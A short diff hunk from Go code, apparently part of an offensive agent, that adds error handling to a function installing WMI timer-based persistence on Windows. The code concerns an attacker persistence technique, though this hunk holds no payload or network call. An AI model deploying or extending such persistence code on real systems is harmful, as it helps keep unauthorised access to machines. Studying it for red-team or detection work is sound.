@@ -158,7 +158,9 @@ func wmiPersistInstall(args wmiPersistArgs) structs.CommandResult {
 				if _, err := oleutil.PutProperty(timerDisp, "IntervalBetweenEvents", intervalMs); err != nil {
 					return errorf("Error setting timer IntervalBetweenEvents: %v", err)
 				}
-				oleutil.CallMethod(timerDisp, "Put_")
+				if _, err := oleutil.CallMethod(timerDisp, "Put_"); err != nil {
+					return errorf("Error creating timer instruction: %v", err)
+				}
 			}
 		}
 	}
